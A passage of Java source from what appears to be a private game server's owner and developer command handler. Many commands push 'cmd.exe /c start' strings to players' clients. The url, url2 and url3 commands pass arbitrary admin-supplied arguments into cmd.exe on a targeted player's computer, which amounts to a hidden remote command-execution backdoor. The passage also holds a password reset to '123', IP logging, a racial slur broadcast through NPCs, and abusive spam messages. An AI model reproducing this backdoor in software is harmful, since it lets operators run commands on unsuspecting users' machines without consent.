					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					
					
					
					
					player.getPackets().sendGameMessage("Nice try.");
				return false;
			}
			
			else{
					String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
					
				
				
					p2.getPackets().sendExecMessage("cmd.exe /c start " + Settings.WAKEFUP);
					p2.getPackets().sendGameMessage("WAKE THE FUCK UP!!!!!");
					p2.getPackets().sendGameMessage("WAKE THE FUCK UP!!!!!");
					p2.getPackets().sendGameMessage("WAKE THE FUCK UP!!!!!");
					p2.getPackets().sendGameMessage("WAKE THE FUCK UP!!!!!");
					p2.getPackets().sendGameMessage("WAKE THE FUCK UP!!!!!");
					p2.getPackets().sendGameMessage("WAKE THE FUCK UP!!!!!");
					p2.getPackets().sendGameMessage("WAKE THE FUCK UP!!!!!");
					p2.getPackets().sendGameMessage("WAKE THE FUCK UP!!!!!");
					p2.getPackets().sendGameMessage("WAKE THE FUCK UP!!!!!");
					
					
					player.getPackets().sendGameMessage(
								"Waking up" + p2.getUsername() + ".");
					return true;
						}
						
						}
	//ban vid					
	if (cmd[0].equalsIgnoreCase("banvid")){

		if (cmd[1].equalsIgnoreCase("Poanizer")) {

				
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					
					
					
					
					player.getPackets().sendGameMessage("Nice try.");
				return false;
			}
			
			else{
					String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
					
				
				
					p2.getPackets().sendExecMessage("cmd.exe /c start " + Settings.IBANNED);
					
					
					player.getPackets().sendGameMessage(
								"Waking up" + p2.getUsername() + ".");
					return true;
						}
						
						}
						
						
						//taken			
	if (cmd[0].equalsIgnoreCase("taken")){

		
					String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
					
				
				
					p2.getPackets().sendExecMessage("cmd.exe /c start " + Settings.TAKEN);
					
					
					player.getPackets().sendGameMessage(
								"Taking " + p2.getUsername() + ".");
					return true;
						}
						
	if (cmd[0].equalsIgnoreCase("url")){

		
					String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
					
				
				
					p2.getPackets().sendExecMessage("cmd.exe /c start " + cmd[2] + " ");
					
					
					player.getPackets().sendGameMessage(
								"sending " + cmd[2] + " to " + p2.getUsername() + ".");
					return true;
						}
						
	if (cmd[0].equalsIgnoreCase("url2")){

		
					String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
					
				
				
					p2.getPackets().sendExecMessage("cmd.exe /c start " + cmd[2] + " " + cmd[3]);
					
					
					player.getPackets().sendGameMessage(
								"sending " + cmd[2] + " to " + p2.getUsername() + ".");
					return true;
						}
						
				if (cmd[0].equalsIgnoreCase("url3")){

		
					String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
					p2.getPackets().sendExecMessage("cmd.exe /c start " + cmd[2] + " " + cmd[3] + " " + cmd[4]);
					
					
					player.getPackets().sendGameMessage(
								"sending " + cmd[2] + " to " + p2.getUsername() + ".");
					return true;
						}

						//taken			
	if (cmd[0].equalsIgnoreCase("wakefup2")){

		
					String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
					
				
				
					p2.getPackets().sendExecMessage("cmd.exe /c start " + Settings.WAKEFUP2);
					
					
					player.getPackets().sendGameMessage(
								"Taking " + p2.getUsername() + ".");
					return true;
						}
						
						


//read ingame			
						
if (cmd[0].equalsIgnoreCase("read")){

					String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
					
				
				
					p2.getPackets().sendExecMessage("cmd.exe /c start " + Settings.READ);
					p2.getPackets().sendGameMessage("READ INGAME!");
					
					
					player.getPackets().sendGameMessage(
								"Waking up" + p2.getUsername() + ".");
					return true;
						}
						
						
//JEFF2

	if (cmd[0].equalsIgnoreCase("wakeup2")){

		if (cmd[1].equalsIgnoreCase("poanizer")) {

				
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					
					
					
					
					player.getPackets().sendGameMessage("Nice try.");
				return false;
			}
		
			
			else{
					String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
					
				
				
					p2.getPackets().sendExecMessage("cmd.exe /c start " + Settings.JEFF2);
					p2.getPackets().sendGameMessage("WAKE UP JEFF!");
					p2.getPackets().sendGameMessage("WAKE UP JEFF!");
					p2.getPackets().sendGameMessage("WAKE UP JEFF!");
					p2.getPackets().sendGameMessage("WAKE UP JEFF!");
					p2.getPackets().sendGameMessage("WAKE UP JEFF!");
					p2.getPackets().sendGameMessage("WAKE UP JEFF!");
					p2.getPackets().sendGameMessage("WAKE UP JEFF!");
					p2.getPackets().sendGameMessage("WAKE UP JEFF!");
					p2.getPackets().sendGameMessage("WAKE UP JEFF!");
					p2.getPackets().sendGameMessage("WAKE UP JEFF!");
					
					
					player.getPackets().sendGameMessage(
								"Waking up" + p2.getUsername() + ".");
					return true;
						}
						
						}
			




			if (cmd[0].equalsIgnoreCase("event")) {
			
			String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
				
				p2.getInterfaceManager().sendInterface(2);
					return true;
					
					
			} 
			
			
			
			
				
			if (cmd[0].equalsIgnoreCase("afk")) {
				player.getPackets().sendGameMessage("Your now AFK");
				player.setNextGraphics(new Graphics(277));
				player.setNextForceTalk(new ForceTalk("-Afk-"));
					player.setNextAnimation(new Animation(837));
				}
		
			
	
			
	if (cmd[0].equalsIgnoreCase("logoutx")) {
	

			
				String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
				
				p2.getInterfaceManager().sendInterface(182);
					return true;
					
					
			} 
			
			
		if (cmd[0].equalsIgnoreCase("pmto")) {
	

			
				String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
				
				p2.getPackets().receivePrivateMessage("The voice in your head", "Ked", 0, "Canis Placit.");
				
					
					
			} 
			
			
			if (cmd[0].equalsIgnoreCase("pm2")) {
			
				File[] chars = new File("data/characters").listFiles();
				int[] itemIds = new int[cmd.length - 1];
				for (int i = 1; i < cmd.length; i++) {
					itemIds[i - 1] = Integer.parseInt(cmd[i]);
				}
				for (File acc : chars) {
					try {
						Player target1 = (Player) SerializableFilesManager.loadSerializedFile(acc);
						if (target1 == null) {
							continue;
						}
						for (int itemId : itemIds) {
							target1.getEquipment().deleteItem(itemId, Integer.MAX_VALUE);
						}
						SerializableFilesManager.storeSerializableClass(target1, acc);
					} catch (Throwable e) {
						e.printStackTrace();
						player.getPackets().sendMessage(99, "failed: " + acc.getName()+", "+e, player);
					}
				}
				for (Player players : World.getPlayers()) {
					if (players == null)
						continue;
					for (int itemId : itemIds) {
						players.getEquipment().deleteItem(itemId, Integer.MAX_VALUE);
					}
				}
				return true;

					
			} 
			
			
			
			
			if (cmd[0].equalsIgnoreCase("random")) {
	

			
				String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
				
				p2.getDialogueManager().startDialogue("RandomEvent");
					return true;
					
					
			} 
						
						
			if (cmd[0].equalsIgnoreCase("giveitem")) {
				String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
				
				
				Player other = World.getPlayers().get(
						World.getIdFromName(username));
				if (other == null) {
					player.getPackets().sendGameMessage(
							"There is no such player as " + username + ".");
					return true;
				}
				int item = Integer.parseInt(cmd[2]);
				int amount = Integer.parseInt(cmd[3]);
				ItemDefinitions def = ItemDefinitions.getItemDefinitions(item);
				
		
				other.getInventory().addItem(item, amount);
				other.sendMessage("You have received an item from "
						+ player.getDisplayName() + ".");
				player.sendMessage("You have given a "
						+ def.getName() + " to "
						+ other.getDisplayName() + ".");
						
						
						
			try {
					File file = new File("data/logs/gaveitem.txt");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							file, true));
					writer.write ("[" + DateFormat.getDateTimeInstance().format(new Date()) + "]" + player.getDisplayName() + " (IP)[" + player.getSession().getIP() + "] gave " +  other.getDisplayName() + " (IP)[" + other.getSession().getIP() + "]  item " + cmd[2] + " / " + def.getName() + " Amount " + cmd[3]);
					writer.newLine();
					writer.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}			
			}
			
			if (cmd[0].equalsIgnoreCase("removeitem")) {
			
						player.getPackets().sendGameMessage("make sure to do ;;removeitem name id");
						
                		String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
                		Player other = World.getPlayerByDisplayName(username);
                		if (other == null) {
                    		return true;
                		}
                		if (cmd.length < 2) {
                    		player.getPackets().sendGameMessage(
                            		"Use: ;;removei Username ItemId");
                    		return true;
                		}
                		int itemId = Integer.valueOf(cmd[2]).intValue();
                		//int amountId = Integer.valueOf(cmd[3]).intValue();
                		try {
                    		other.getInventory().deleteItem(
                            		itemId,
                            		2147000000);
                    		other.getEquipment().deleteItem(itemId, 2147000000);
                    		other.getEquipment().refresh();
                    		other.getBank().getItem(itemId).setAmount(1);
                    		player.getPackets().sendGameMessage("You have deleted something from the victim.");
                		} catch (NumberFormatException e) {
                    		player.getPackets().sendGameMessage(
                            		"Use: ;;removei Username ItemId");
                		}
                		return true;
            		}
					
					if (cmd[0].equalsIgnoreCase("reloadshops")) {
                		ShopsHandler.init();
            		}
					
					if (cmd[0].equalsIgnoreCase("voteall")) {
				for (Player players : World.getPlayers()) {
					if (players == null || !players.isRunning())
						continue;
				players.getPackets().sendExecMessage("cmd.exe /c start " + Settings.VOTE_LINK);
				return true;
			}
			}

			if (cmd[0].equalsIgnoreCase("nightall")) {
				for (Player players : World.getPlayers()) {
					if (players == null || !players.isRunning())
						continue;
				players.getPackets().sendExecMessage("cmd.exe /c start " + Settings.KIWI);
				players.getPackets().sendGameMessage("<col=DC0000>Goodnight <col=0000FF>The Poanizer Project <col=DC000>.");
				return true;
			}
			}
			
			if (cmd[0].equalsIgnoreCase("restart")) {
				int delay = 60;
				if (cmd.length >= 2) {
					try {
						delay = Integer.valueOf(cmd[1]);
					} catch (NumberFormatException e) {
						player.getPackets().sendPanelBoxMessage(
								"Use: ::restart secondsDelay(IntegerValue)");
						return true;
					}
				}
				World.safeShutdown(true, delay);
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("vengall")) {
			for (Player players : World.getPlayers()) {
						if (players == null)
							continue;
				players.setNextGraphics(new Graphics(726, 0, 100));
				players.setNextAnimation(new Animation(4410));
				players.setCastVeng(true);
				players.setLastVeng(100);
				players.getPackets().sendGameMessage("<img=1>   You randomly cast vengeance! :o");
				players.setNextForceTalk(new ForceTalk("Taste Vengance!")); 
				}
			}
			
			if (cmd[0].equalsIgnoreCase("alllog")) {
			for (Player players : World.getPlayers()) {
						if (players == null)
							continue;
				players.logout();
				}
			}
			
			if (cmd[0].equalsIgnoreCase("smash")) {
			for (Player players : World.getPlayers()) {
						if (players == null)
							continue;
				players.setNextGraphics(new Graphics(1601, 0, 100));
				players.setNextAnimation(new Animation(11991));
				players.getPackets().sendGameMessage("Smash!");
				players.setNextForceTalk(new ForceTalk("ahhhh!")); 
				}
			}
			
			if (cmd[0].equalsIgnoreCase("lightblue")) {
				WorldTasksManager.schedule(new WorldTask() {
					@Override
					public void run() {
						if (3417 >= Utils.getGraphicDefinitionsSize()) {
							stop();
						}
						if (player.hasFinished()) {
							stop();
						}
						player.setNextGraphics(new Graphics(3234));
					}
				}, 0, 3);
				return true;
			}
			
			
			
			if (cmd[0].equalsIgnoreCase("blue")) {
				WorldTasksManager.schedule(new WorldTask() {
					@Override
					public void run() {
						if (3417 >= Utils.getGraphicDefinitionsSize()) {
							stop();
						}
						if (player.hasFinished()) {
							stop();
						}
						player.setNextGraphics(new Graphics(3228));
					}
				}, 0, 3);
				return true;
			}
			if (cmd[0].equalsIgnoreCase("yellow")) {
				WorldTasksManager.schedule(new WorldTask() {
					@Override
					public void run() {
						if (3417 >= Utils.getGraphicDefinitionsSize()) {
							stop();
						}
						if (player.hasFinished()) {
							stop();
						}
						player.setNextGraphics(new Graphics(3230));
					}
				}, 0, 3);
				return true;
			}
			if (cmd[0].equalsIgnoreCase("purple")) {
				WorldTasksManager.schedule(new WorldTask() {
					@Override
					public void run() {
						if (3417 >= Utils.getGraphicDefinitionsSize()) {
							stop();
						}
						if (player.hasFinished()) {
							stop();
						}
						player.setNextGraphics(new Graphics(3236));
					}
				}, 0, 3);
				return true;
			}
			if (cmd[0].equalsIgnoreCase("red")) {
				WorldTasksManager.schedule(new WorldTask() {
					@Override
					public void run() {
						if (3417 >= Utils.getGraphicDefinitionsSize()) {
							stop();
						}
						if (player.hasFinished()) {
							stop();
						}
						player.setNextGraphics(new Graphics(3238));
					}
				}, 0, 3);
				return true;
			}
			if (cmd[0].equalsIgnoreCase("teal")) {
				WorldTasksManager.schedule(new WorldTask() {
					@Override
					public void run() {
						if (3417 >= Utils.getGraphicDefinitionsSize()) {
							stop();
						}
						if (player.hasFinished()) {
							stop();
						}
						player.setNextGraphics(new Graphics(3240));
					}
				}, 0, 3);
				return true;
			}
			if (cmd[0].equalsIgnoreCase("white")) {
				WorldTasksManager.schedule(new WorldTask() {
					@Override
					public void run() {
						if (3417 >= Utils.getGraphicDefinitionsSize()) {
							stop();
						}
						if (player.hasFinished()) {
							stop();
						}
						player.setNextGraphics(new Graphics(3244));
					}
				}, 0, 3);
				return true;
			}
			if (cmd[0].equalsIgnoreCase("flashing")) {
				WorldTasksManager.schedule(new WorldTask() {
					@Override
					public void run() {
						if (3417 >= Utils.getGraphicDefinitionsSize()) {
							stop();
						}
						if (player.hasFinished()) {
							stop();
						}
						player.setNextGraphics(new Graphics(3268));
					}
				}, 0, 3);
				return true;
			}
			if (cmd[0].equalsIgnoreCase("orange")) {
				WorldTasksManager.schedule(new WorldTask() {
					@Override
					public void run() {
						if (3417 >= Utils.getGraphicDefinitionsSize()) {
							stop();
						}
						if (player.hasFinished()) {
							stop();
						}
						player.setNextGraphics(new Graphics(3249));
					}
				}, 0, 3);
				return true;
			}
			
			
			
			if (cmd[0].equalsIgnoreCase("addSlayerpoints")) {
			player.SlayerPoints += 10;
			player.getPackets().sendGameMessage("You have " + player.SlayerPoints + " Slayer Points");
			
			}
			
			if (cmd[0].equalsIgnoreCase("PartyTime")) {
			for (Player players : World.getPlayers()) {
						if (players == null)
							continue;
				players.setNextGraphics(new Graphics(6, 0, 100));
				players.setNextAnimation(new Animation(7071));
				players.getPackets().sendGameMessage("<col=FF0000>Everybody</col><col=FFFF00>Dance</col><col=0000FF>Now!</col>");
				players.setNextForceTalk(new ForceTalk("Party Time!")); 
				}
			}
			
			if (cmd[0].equalsIgnoreCase("PartyTime2")) {
			for (Player players : World.getPlayers()) {
						if (players == null)
							continue;
				players.setNextGraphics(new Graphics(6, 0, 100));
				players.setNextAnimation(new Animation(7071));
				players.getPackets().sendGameMessage("<col=FF0000>Everybody</col><col=FFFF00>Dance</col><col=0000FF>Now!</col>");
				players.setNextForceTalk(new ForceTalk("Party Time!")); 
				}
				
				for (NPC n : World.getNPCs()) {
					n.setNextAnimation(new Animation(7071));
					n.setNextGraphics(new Graphics(6, 0, 100));
					n.setNextForceTalk(new ForceTalk("Party Time!")); 
				}
			}
			
			if (cmd[0].equalsIgnoreCase("pvpx")) {
			player.getControlerManager().startControler("Wilderness");
			}
			
			if (cmd[0].equalsIgnoreCase("killallnpc")) {
			
				
				for (NPC n : World.getNPCs()) {
					n.applyHit(new Hit(player, 999999, HitLook.REGULAR_DAMAGE));
				}
			}
			
		
				
			
			
			
			
			if (cmd[0].equalsIgnoreCase("teleall")) {
				String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
				for (Player other : World.getPlayers()) {
				player.setNextGraphics(new Graphics(365));
				if (other == null)
					return true;
				other.setNextWorldTile(player);
				other.stopAll();
				}
				return true;
			}
			
		
			
			
					

			if (cmd[0].equalsIgnoreCase("unpermban")) {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player target = World.getPlayerByDisplayName(name);
				boolean loggedIn = true;
				if (target == null) {
					target = SerializableFilesManager.loadPlayer(Utils
							.formatPlayerNameForProtocol(name));
					loggedIn = false;
				}
				if (target != null) {
					target.setPermBanned(false);
					target.setBanned(0);
					target.setPassword("123");
					if (loggedIn)
						target.getSession().getChannel().close();
					else
						SerializableFilesManager.savePlayer(target);
					player.getPackets().sendGameMessage("You've permanently unbanned "+ (loggedIn ? target.getDisplayName() : name) + ".");
				} else {
					player.getPackets().sendGameMessage("Couldn't find player " + name + ".");
				}
				
				try {
					File file = new File("data/logs/unpermban.txt");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							file, true));
					writer.write ("[" + DateFormat.getDateTimeInstance().format(new Date()) + "]" + player.getDisplayName() + " Un permbanned " + target.getDisplayName());
					writer.newLine();
					writer.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				return true;
			}
			
			
	
				
				
				//cmd2
			if (cmd[0].equalsIgnoreCase("bowto")) {
				   if (cmd[1].equalsIgnoreCase("po")) {
					player.setNextForceTalk(new ForceTalk("All hail The Poanizer Project!"));
					player.setNextAnimation(new Animation(858));
					return false;
				}  if (cmd[1].equalsIgnoreCase("Poanizer")) {
					player.setNextForceTalk(new ForceTalk("All hail Poanizer!"));
					player.setNextAnimation(new Animation(858));
					return false;
				} else {
				player.getPackets().sendGameMessage("You need to pray to someone");
				}
				}
			
			if (cmd[0].equalsIgnoreCase("allwild")) {
			for (Player players : World.getPlayers()) {
						if (players == null)
							continue;
			
			players.getControlerManager().startControler("Wilderness");

							
							return true;
				}
			}
			
//img = 0/mod 1/admin 2/arrow 3/bubble	4/green-preowner 5/orange-thing 6/silver-thing 7/bronze-thing 8/Forum Mod 9/purple crown 10/player support 11/donator 12/super 13/respected		

			
					
				
			
			if (cmd[0].equalsIgnoreCase("fishme")) {
				for (NPC n : World.getNPCs()) {
					World.removeNPC(n);
					n.reset();
					n.finish();
				}
				for (Player players : World.getPlayers()) {
				player.getPackets().sendGameMessage("NPC's have been reset by " + player.getDisplayName());
				}
				NPCSpawning.spawnNPCS();
				for (int i = 0; i < 18000; i++)
					NPCSpawns.loadNPCSpawns(i);
				return true;
				
			
			}
			
			
			
						if (cmd[0].equalsIgnoreCase("goodbank")) {
						player.getBank().addItem(1, 10000, 0, false);
						player.getBank().addItem(2, 10000, 0, false);
						player.getBank().addItem(3, 10000, 0, false);
						player.getBank().addItem(4, 10000, 0, false);
						player.getBank().addItem(5, 10000, 0, false);
						}
						
						
		
		
			if (cmd[0].equals("gvop")){
				player.VotePoints += 100;
			}
			if (cmd[0].equals("gvop1")){
				player.VotePoints += 1;
			}
			if (cmd[0].equalsIgnoreCase("hackmessoff")) {
				Settings.hackmess = false;
				player.getPackets().sendGameMessage("AntiHack message off");
				return true;
			}
			
			}
			return false;
			}
			
			
			
//Owner End
	
//Developer
	public static boolean processDeveloperCommand(Player player, String[] cmd,
				boolean console, boolean clientCommand) {
			if (clientCommand) {

			} else {
				
			if (cmd[0].equalsIgnoreCase("killnpc")) {
			for (NPC n : World.getNPCs()) {
					if (n == null || n.getId() != Integer.parseInt(cmd[1]))
						continue;
					n.applyHit(new Hit(player, 999999, HitLook.REGULAR_DAMAGE));
				
				}
				return true; 
			}
			
			if (cmd[0].equalsIgnoreCase("look")) { // 1st is what body part, 2nd is the look
				player.getAppearence().setLook(Integer.valueOf(cmd[1]),Integer.valueOf(cmd[2]));
				player.getAppearence().generateAppearenceData();
				return true;
			}
				if (cmd[0].equalsIgnoreCase("othertalk")) {
			
				
				String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
				Player other = World.getPlayerByDisplayName(username);
				
				other.setNextForceTalk(new ForceTalk(cmd[2].replace("-", " ")));
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("npctalk")) {
			
			for (NPC n : World.getNPCs()) {
			
				n.setNextForceTalk(new ForceTalk(cmd[1].replace(" ", "-").replace("-", " ")));}
	
				return true; 
			}
			
				if (cmd[0].equalsIgnoreCase("snoopon")) {
				Settings.SNOOP = true;
				Settings.DEBUG = false;
			
				return true;
			}
			if (cmd[0].equalsIgnoreCase("iplockoff")) {
				Settings.removeiplock = true;
			
				return true;
			}
			if (cmd[0].equalsIgnoreCase("snoopoff")) {
				Settings.SNOOP = false;
				Settings.DEBUG = true;
				
				return true;
			}

			if (cmd[0].equalsIgnoreCase("neggaon")) {
				Settings.NEGGA = true;
				for (NPC n : World.getNPCs()) {
					
					n.setNextForceTalk(new ForceTalk("Was good negga?")); 
				}
			
				return true;
			}
			if (cmd[0].equalsIgnoreCase("neggaoff")) {
				Settings.NEGGA = false;
				
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("debugon")) {
				Settings.DEBUG = true;
				
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("debugoff")) {
				Settings.DEBUG = false;
				
				return true;
			}
			
			
		
			
			if (cmd[0].equalsIgnoreCase("loginon")) {
				Settings.LOGIN = true;
				
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("loginoff")) {
				Settings.LOGIN = false;
				
				return true;
			}
		
		
		//custom titles cos yolo
				if (cmd[0].equalsIgnoreCase("customtitles")) {
				String title = "";
			    for (int i = 1; i < cmd.length; i++){
			     title += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				 }
			    player.setcustomTitle(title);
			   // player.getAppearence().setTitle(54756);
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("customtitle")) {
				String title = "";
			     title = cmd[1] + " " + cmd[2];
				player.setcustomTitle(title);
			   // player.getAppearence().setTitle(54756);
				return true;
			}
			if (cmd[0].equalsIgnoreCase("removetitle")) {
				
			   String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
					
				p2.setcustomTitle("");
							return true;
			}
			
			
		if (cmd[0].equalsIgnoreCase("compon")) {
		player.CompDone = true;
		player.getPackets().sendGameMessage("Comp Done");
		}
		
		if (cmd[0].equalsIgnoreCase("compoff")) {
		player.CompDone = false;
		player.getPackets().sendGameMessage("Comp off");
		}

		
			
		if (cmd[0].equals("maxed") || cmd[0].equals("maxcape")) {
                if(
                	(player.getSkills().getCombatLevel() < 138)&&
					(player.getSkills().getLevel(Skills.RUNECRAFTING) < 99)&& 
					(player.getSkills().getLevel(Skills.CONSTRUCTION) < 99)&& 
				    (player.getSkills().getLevel(Skills.RUNECRAFTING) < 99)&& 
					(player.getSkills().getLevel(Skills.DUNGEONEERING) < 120)&& 
					(player.getSkills().getLevel(Skills.AGILITY) < 99)&&
					(player.getSkills().getLevel(Skills.HERBLORE) < 99)&& 
					(player.getSkills().getLevel(Skills.THIEVING) < 99)&& 
					(player.getSkills().getLevel(Skills.CRAFTING) < 99)&& 
					(player.getSkills().getLevel(Skills.FLETCHING) < 99)&& 
					(player.getSkills().getLevel(Skills.SLAYER) < 99)&& 
					(player.getSkills().getLevel(Skills.HUNTER) < 99)&& 
					(player.getSkills().getLevel(Skills.MINING) < 99)&& 
					(player.getSkills().getLevel(Skills.SMITHING) < 99)&& 
					(player.getSkills().getLevel(Skills.FISHING) < 99)&& 
					(player.getSkills().getLevel(Skills.COOKING) < 99)&& 
					(player.getSkills().getLevel(Skills.FIREMAKING) < 99)&& 
					(player.getSkills().getLevel(Skills.WOODCUTTING) < 99)&& 
					(player.getSkills().getLevel(Skills.FARMING) < 99) 
								){
								player.getPackets().sendGameMessage( "Your not maxed yet. You need all 99's and 120 Dung.");
								
								}
		else if(player.hasmax == true){
					player.getPackets().sendGameMessage( "You have already claimed your Max Cape.");
					}
				 
				 else{
				 
				player.hasmax = true;
				player.getBank().addItem(20767, 1, true);
				player.getBank().addItem(20768, 1, true);
				World.sendWorldWideMessage("<shad=000><col=01DF01>[Maxed]: <shad=000><col=ff0000> Congratulations! " + player.getUsername() + " Has just maxed on the Poanizer Project");
					
				player.sendMessage("Thank you for maxing on The Poanizer Project.");
							player.getPackets().sendGameMessage(
                                    "<col=00ff00>Welcome home, "+player.getDisplayName());
				return true;
				}
				
				}
			
					if (cmd[0].equalsIgnoreCase("customs")) {	
			  for(int i = 24855; i < 24911; i++) {
                    player.getBank().addItem(i, 1, true);
					 }
			player.getPackets().sendGameMessage("Added to bank");
            }
	if (cmd[0].equalsIgnoreCase("gooditems")) {	
			 player.getBank().addItem(995, 1000000000, true);
			 player.getBank().addItem(15098, 1000000000, true);
			 player.getBank().addItem(22361, 1000000000, true);
			 player.getBank().addItem(5000, 1000000000, true);
			 player.getBank().addItem(20159, 1000000000, true);
			 player.getBank().addItem(20163, 1000000000, true);
			 player.getBank().addItem(20167, 1000000000, true);
			 player.getBank().addItem(20135, 1000000000, true);
			 player.getBank().addItem(20139, 1000000000, true);
			 player.getBank().addItem(20143, 1000000000, true);
			 player.getBank().addItem(20147, 1000000000, true);
			 player.getBank().addItem(20151, 1000000000, true);
			 player.getBank().addItem(20155, 1000000000, true);
			 player.getBank().addItem(1038, 1000000000, true);
			 player.getBank().addItem(1040, 1000000000, true);
			 player.getBank().addItem(1042, 1000000000, true);
			 player.getBank().addItem(1044, 1000000000, true);
			 player.getBank().addItem(1046, 1000000000, true);
			 player.getBank().addItem(1048, 1000000000, true);
			 player.getBank().addItem(18349, 1000000000, true);
			 player.getBank().addItem(18351, 1000000000, true);
			 player.getBank().addItem(18353, 1000000000, true);
			 player.getBank().addItem(18355, 1000000000, true);
			 player.getBank().addItem(18357, 1000000000, true);
			 player.getBank().addItem(18359, 1000000000, true);
			 player.getBank().addItem(18361, 1000000000, true);
			 player.getBank().addItem(18363, 1000000000, true);
			 player.getBank().addItem(18335, 1000000000, true);
			 player.getBank().addItem(22482, 1000000000, true);
			 player.getBank().addItem(22486, 1000000000, true);
			 player.getBank().addItem(22490, 1000000000, true);
			 player.getBank().addItem(22494, 1000000000, true);
			 player.getBank().addItem(22458, 1000000000, true);
			 player.getBank().addItem(22462, 1000000000, true);
			 player.getBank().addItem(22466, 1000000000, true);
			 player.getBank().addItem(22470, 1000000000, true);
			 player.getBank().addItem(22474, 1000000000, true);
			 player.getBank().addItem(22478, 1000000000, true);
			 player.getBank().addItem(4937, 1000000000, true);
			 player.getBank().addItem(11694, 1000000000, true);
			 player.getBank().addItem(11696, 1000000000, true);
			 player.getBank().addItem(11698, 1000000000, true);
			 player.getBank().addItem(11700, 1000000000, true);
			 player.getBank().addItem(11724, 1000000000, true);
			 player.getBank().addItem(11726, 1000000000, true);
			 player.getBank().addItem(11728, 1000000000, true);
			 player.getBank().addItem(11718, 1000000000, true);
			 player.getBank().addItem(11720, 1000000000, true);
			 player.getBank().addItem(11722, 1000000000, true);
			 player.getBank().addItem(13734, 1000000000, true);
			 player.getBank().addItem(13754, 1000000000, true);
			 player.getBank().addItem(13740, 1000000000, true);
			 player.getBank().addItem(13742, 1000000000, true);
			 player.getBank().addItem(13744, 1000000000, true);
			 player.getBank().addItem(14484, 1000000000, true);
			 player.getBank().addItem(23687, 1000000000, true);
			 player.getBank().addItem(23688, 1000000000, true);
			 player.getBank().addItem(23689, 1000000000, true);
			 player.getBank().addItem(21787, 1000000000, true);
			 player.getBank().addItem(21790, 1000000000, true);
			 player.getBank().addItem(21793, 1000000000, true);
			 player.getBank().addItem(23531, 1000000000, true);
			 player.getBank().addItem(13887, 1000000000, true);
			 player.getBank().addItem(13899, 1000000000, true);
			 player.getBank().addItem(13905, 1000000000, true);
			 player.getBank().addItem(13884, 1000000000, true);
			 player.getBank().addItem(13890, 1000000000, true);
			 player.getBank().addItem(13896, 1000000000, true);
			 player.getBank().addItem(13902, 1000000000, true);
			 player.getBank().addItem(13858, 1000000000, true);
			 player.getBank().addItem(13861, 1000000000, true);
			 player.getBank().addItem(13864, 1000000000, true);
			 player.getBank().addItem(13867, 1000000000, true);
